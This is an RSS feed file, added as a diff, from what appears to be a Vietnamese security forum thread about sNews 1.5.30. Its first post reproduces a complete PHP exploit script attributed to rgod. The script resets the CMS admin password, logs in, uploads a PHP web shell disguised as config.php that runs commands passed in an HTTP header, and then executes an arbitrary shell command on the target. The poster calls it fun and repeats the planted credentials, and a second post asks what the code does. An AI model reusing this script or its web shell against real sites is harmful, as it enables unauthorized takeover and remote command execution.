@@ -1,0 +1,298 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "sNews &lt;= 1.5.30 unauthorized access ..."]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "sNews &lt;= 1.5.30 unauthorized access ..."]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>sNews &amp;lt;= 1.5.30 unauthorized access ...</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+print_r&#40;'
+---------------------------------------------------------------------------
+sNews &lt;= 1.5.30 unauthorized access / reset admin pass / cmd exec exploit
+by rgod
+dork: "Barbecued by sNews"
+mail: retrog at alice dot it
+site:<span class="link"> http://retrogod.altervista.org</span>
+---------------------------------------------------------------------------
+'&#41;;
+/*
+works regardless of php.ini settings
+*/
+if &#40;$argc&lt;5&#41; {
+    print_r&#40;'
+---------------------------------------------------------------------------
+Usage: php '.$argv&#91;0&#93;.' host path your_ip cmd &#91;options&#93;
+host:      target server &#40;ip/hostname&#41;
+path:      path to sNews
+your_ip:   your ip address, this is needed for upload
+           this is automatically set to your proxy ip, if you use one
+cmd:       a shell comand
+Options:
+ -p&#91;port&#93;:    specify a port other than 80
+ -P&#91;ip:port&#93;: specify a proxy
+Example:
+php '.$argv&#91;0&#93;.' localhost /snews/ ls -la -P1.1.1.1:80
+php '.$argv&#91;0&#93;.' localhost / cat snews.php -p81
+---------------------------------------------------------------------------
+'&#41;;
+    die;
+}
+
+error_reporting&#40;"E_ALL"&#41;;
+ini_set&#40;"max_execution_time",0&#41;;
+ini_set&#40;"default_socket_timeout",5&#41;;
+
+function quick_dump&#40;$string&#41;
+{
+  $result='';$exa='';$cont=0;
+  for &#40;$i=0; $i&lt;=strlen&#40;$string&#41;-1; $i++&#41;
+  {
+   if &#40;&#40;ord&#40;$string&#91;$i&#93;&#41; &lt;= 32 &#41; | &#40;ord&#40;$string&#91;$i&#93;&#41; &gt; 126 &#41;&#41;
+   {$result.="  .";}
+   else
+   {$result.="  ".$string&#91;$i&#93;;}
+   if &#40;strlen&#40;dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;&#41;==2&#41;
+   {$exa.=" ".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
+   else
+   {$exa.=" 0".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
+   $cont++;if &#40;$cont==15&#41; {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '&#40;\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b&#41;';
+
+function sendpacketii&#40;$packet&#41;
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if &#40;$proxy==''&#41; {
+    $ock=fsockopen&#40;gethostbyname&#40;$host&#41;,$port&#41;;
+    if &#40;!$ock&#41; {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match&#40;$proxy_regex,$proxy&#41;;
+    if &#40;!$c&#41; {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode&#40;':',$proxy&#41;;
+    echo "Connecting to ".$parts&#91;0&#93;.":".$parts&#91;1&#93;." proxy...\r\n";
+    $ock=fsockopen&#40;$parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
+    if &#40;!$ock&#41; {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs&#40;$ock,$packet&#41;;
+  if &#40;$proxy==''&#41; {
+    $html='';
+    while &#40;!feof&#40;$ock&#41;&#41; {
+      $html.=fgets&#40;$ock&#41;;
+    }
+  }
+  else {
+    $html='';
+    while &#40;&#40;!feof&#40;$ock&#41;&#41; or &#40;!eregi&#40;chr&#40;0x0d&#41;.chr&#40;0x0a&#41;.chr&#40;0x0d&#41;.chr&#40;0x0a&#41;,$html&#41;&#41;&#41; {
+      $html.=fread&#40;$ock,1&#41;;
+    }
+  }
+  fclose&#40;$ock&#41;;
+}
+
+$host=$argv&#91;1&#93;;
+$path=$argv&#91;2&#93;;
+$your_ip=$argv&#91;3&#93;;
+$port=80;
+$proxy="";
+$cmd="";
+for &#40;$i=4; $i&lt;$argc; $i++&#41;{
+$temp=$argv&#91;$i&#93;&#91;0&#93;.$argv&#91;$i&#93;&#91;1&#93;;
+if &#40;&#40;$temp&lt;&gt;"-p"&#41; and &#40;$temp&lt;&gt;"-P"&#41;&#41; {$cmd.=" ".$argv&#91;$i&#93;;}
+if &#40;$temp=="-p"&#41;
+{
+  $port=str_replace&#40;"-p","",$argv&#91;$i&#93;&#41;;
+}
+if &#40;$temp=="-P"&#41;
+{
+  $proxy=str_replace&#40;"-P","",$argv&#91;$i&#93;&#41;;
+  $tmp=explode&#40;":",$proxy&#41;;
+  $your_ip=$tmp&#91;0&#93;;
+}
+}
+if &#40;&#40;$path&#91;0&#93;&lt;&gt;'/'&#41; or &#40;$path&#91;strlen&#40;$path&#41;-1&#93;&lt;&gt;'/'&#41;&#41; {echo 'Error... check the path!'; die;}
+if &#40;$proxy==''&#41; {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+/*
+software site:<span class="link"> http://www.solucija.com/home/snews/</span>
+
+you can have unauthorized access to admin password reset feature and other ones,
+after that you can upload a php file and launch commands
+
+see snews.php near lines 392-395:
+...
+function center&#40;&#41; {
+	if &#40;isset&#40;$_GET&#91;'category'&#93;&#41;&#41; {$id = $action = $_GET&#91;'category'&#93;;}
+	if &#40;isset&#40;$_GET&#91;'articleid'&#93;&#41;&#41; {$articleid = $_GET&#91;'articleid'&#93;;}
+	if &#40;isset&#40;$_POST&#91;'submit_text'&#93;&#41;&#41; {processing&#40;&#41;; $processed = true;}
+...
+
+now look at processing&#40;&#41; function near line 1300:
+
+...
+function processing&#40;&#41; {
+	if &#40;$_SESSION&#91;db&#40;'website'&#41;.'Logged_In'&#93; != 'True'&#41; {notification&#40;l&#40;'error_not_logged_in'&#41;,'','login/'&#41;;}
+...
+
+and to notification&#40;&#41; one near lines 675-680:
+
+...
+function notification&#40;$error, $errNote, $link&#41; {
+	$errNote = !empty&#40;$errNote&#41; ? '&lt;br /&gt;'.$errNote : '';
+	echo '&lt;h2'.&#40;!empty&#40;$error&#41; ? ' class="error"&gt;'.l&#40;'admin_error'&#41;.'&lt;/h2&gt;&lt;p&gt;'.$error.$errNote.'&lt;/p&gt;' : '&gt;'.l&#40;'operation_completed'&#41;.'&lt;/h2&gt;'&#41;;
+	echo &#40;!empty&#40;$link&#41;&#41; ? '&lt;p&gt;&lt;a href="'.db&#40;'website'&#41;.$link.'" title="'.l&#40;'back'&#41;.'"&gt;'.l&#40;'back'&#41;.'&lt;/a&gt;&lt;/p&gt;' : '';
+}
+...
+
+funny! there is no exit&#40;&#41; or die&#40;&#41;...
+
+this one reset the admin password and try to upload a php file
+*/
+
+$data='-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="submit_text";
+
+1
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="task";
+
+changeup
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="submit_pass";
+
+1
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="uname";
+
+suntzu
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="pass1";
+
+suntzu
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="pass2";
+
+suntzu
+-----------------------------7d61bcd1f033e--
+';
+$packet ="POST ".$p." HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
+$packet.="Connection: close\r\n\r\n";
+$packet.=$data;
+sendpacketii&#40;$packet&#41;;
+sleep&#40;1&#41;;
+
+$data ="uname=suntzu";
+$data.="&pass=suntzu";
+$data.="&Loginform=True";
+$data.="&submit=Login";
+$packet ="POST ".$p." HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii&#40;$packet&#41;;
+if &#40;!eregi&#40;"Admin&lt;/legend&gt;",$html&#41;&#41;{die&#40;"exploit failed..."&#41;;}
+$cookie="";
+$temp=explode&#40;"Set-Cookie: ",$html&#41;;
+for &#40;$i=1; $i&lt;count&#40;$temp&#41;;$i++&#41;
+{
+$temp2=explode&#40;" ",$temp&#91;$i&#93;&#41;;
+$cookie.=trim&#40;str_replace&#40;"\n","",str_replace&#40;"\r","",$temp2&#91;0&#93;&#41;&#41;&#41;;
+}
+//echo "cookie -&gt; ".$cookie."\n";
+
+$data='-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="upload_dir";
+
+.
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="imagefile"; filename="config.php"
+Content-Type: image/jpeg;
+
+&lt;?php error_reporting&#40;0&#41;; set_time_limit&#40;0&#41;; echo "my_delim"; passthru&#40;$_SERVER&#91;"HTTP_SUNTZU"&#93;&#41;; echo "my_delim";?&gt;
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="ip";
+
+'.$your_ip.'
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="time";
+
+1
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="upload";
+
+Upload
+-----------------------------7d61bcd1f033e--
+';
+$packet ="POST ".$p."files/ HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: close\r\n\r\n";
+$packet.=$data;
+sendpacketii&#40;$packet&#41;;
+sleep&#40;1&#41;;
+
+$packet ="GET ".$p."config.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="SUNTZU: ".$cmd."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii&#40;$packet&#41;;
+if &#40;eregi&#40;"my_delim",$html&#41;&#41;
+{
+$temp=explode&#40;"my_delim",$html&#41;;
+echo $temp&#91;1&#93;;
+}
+else
+{
+  echo "exploit succeeded... but, for some reason, failed to upload shell, try to login manually with user 'suntzu' & password 'suntzu'";
+}
+?&gt;
+
+# milw0rm.com &#91;2007-01-12&#93;</pre>
+		</div>
+cái này vui ghê.
+user: suntzu
+pass: suntzu]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/6174.hva#36049</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/6174.hva#36049</link>
+				<pubDate><![CDATA[Sat, 13 Jan 2007 14:07:50]]> GMT</pubDate>
+				<author><![CDATA[ hieuhoc]]></author>
+			</item>
+			<item>
+				<title>sNews &amp;lt;= 1.5.30 unauthorized access ...</title>
+				<description><![CDATA[ # milw0rm.com [2007-01-12]
+# milw0rm.com [2007-01-12]
+# milw0rm.com [2007-01-12]
+# milw0rm.com [2007-01-12]
+
+
+có lẽ tớ kô muốn nói thêm gì nữa !!
+bạn nói cho tớ biết đoạn code trên nó làm gì đi ??
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/6174.hva#36358</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/6174.hva#36358</link>
+				<pubDate><![CDATA[Mon, 15 Jan 2007 00:33:41]]> GMT</pubDate>
+				<author><![CDATA[ BachDuongTM]]></author>
+			</item>
+	</channel>
+</rss>
